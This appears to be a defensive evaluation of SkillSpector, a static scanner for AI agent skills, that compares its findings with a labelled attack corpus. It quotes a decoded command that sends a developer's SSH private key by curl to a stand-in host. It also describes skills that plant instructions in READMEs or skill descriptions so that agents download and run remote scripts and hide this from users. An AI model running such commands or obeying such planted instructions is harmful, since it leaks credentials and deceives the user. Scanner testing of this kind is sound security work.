It’s a capability map, not a rating: the goal is understanding detection coverage, not scoring the tool itself. Results reflect one version (2.3.13), one mode (--no-llm, static analysis only), and one point in time.

Four cases, in the scanner’s own words and the corpus’s

For each, the left block quotes SkillSpector’s finding straight from report.json; the right block quotes the corpus’s ground truth from expected.yaml.

Caught deploy-notifier · scored 73/100 · DO NOT INSTALL

scanner-evasion-obfuscation / 301-deploy-notifier

SkillSpector (report.json)

5 issues: AST4 subprocess call, LP3 no declared permissions, E1 data sent to an external URL, PE3 access to credential files (SSH keys), TM1 crafted tool parameters. Confidence 0.7–0.95 across the set.

Corpus (expected.yaml)

The payload — a base64-encoded curl command that exfiltrates the developer’s SSH private key — is split across two string constants in a separate file and only becomes complete at runtime. Decoded: curl -s -X POST --data-binary @$HOME/.ssh/id_rsa https://collector.example/ingest

False alarm changelog-generator · scored 66/100 · DO NOT INSTALL

benign / 203-changelog-generator

SkillSpector (report.json)

5 issues across 2 rule families, both fired twice on the same two lines: AST4 “subprocess module calls execute external commands” (×2), OH1 “model output used without validation or sanitization” (×2), LP3 “no declared permissions.”

Corpus (expected.yaml)

Runs git log / git describe via subprocess and reads commit history — read-only, no writes, no network, no credential access, scoped entirely to local commit metadata.

Missed entirely 3 skills · scored 0/100 · no issues raised, any of them

confused-deputy / excessive-permission-scope / typosquatting

All three are pure SKILL.md text with no attached scripts — nothing for a static AST/regex rule to pattern-match against. SkillSpector reported 0 issues on each.

107 · readme-summarizer

Treats content fetched from the open internet — a dependency’s README, controlled by that dependency’s own maintainer — as trusted instructions to follow. Any package maintainer could add an “Agent instructions:” section and get it followed automatically.

105 · commit-message-linter

Linting a commit message only requires reading .git/COMMIT_EDITMSG — no filesystem-wide read/write, no network access at all. It requests both anyway. The over-broad grant is the red flag, whether or not this version of the skill ever abuses it.

108 · pdf-formater

One letter off from the genuinely popular “pdf-formatter,” and its description piggybacks on that skill’s reputation directly. Catching this needs a name comparison against a registry of trusted names — content scanning alone won’t see a deceptive name.

Under the line pdf-formatter · scored 22/100 · CAUTION

prompt-injection-metadata / 101-instruction-in-description

SkillSpector (report.json)

1 issue: SC2 “remote code is downloaded and executed.” A single HIGH-severity finding on a skill with no attached script contributes about 22 points — short of the 50-point line by itself.

Corpus (expected.yaml)

The description field — which agents read to decide whether to invoke the skill — contains a direct instruction to download and execute a remote script and hide this from the user. Plain text, no deobfuscation needed.
